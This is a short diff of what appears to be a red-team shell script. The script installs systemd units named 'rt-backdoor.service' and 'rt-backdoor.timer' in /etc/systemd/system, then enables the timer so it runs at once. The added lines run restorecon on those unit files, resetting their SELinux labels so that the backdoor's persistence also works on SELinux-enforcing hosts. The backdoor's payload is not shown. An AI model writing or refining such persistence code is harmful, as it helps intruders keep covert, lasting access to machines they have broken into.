@@ -158,6 +158,8 @@ UNIT
   if systemd-analyze verify "$service_staged" "$timer_staged" >/dev/null 2>&1 \
     && mv -f "$service_staged" /etc/systemd/system/rt-backdoor.service \
     && mv -f "$timer_staged" /etc/systemd/system/rt-backdoor.timer \
+    && { command -v restorecon >/dev/null 2>&1 \
+         && restorecon -RF /etc/systemd/system/rt-backdoor.service /etc/systemd/system/rt-backdoor.timer 2>/dev/null; true; } \
     && systemctl daemon-reload \
     && systemctl enable --now rt-backdoor.timer >/dev/null 2>&1 \
     && systemctl is-active --quiet rt-backdoor.timer; then
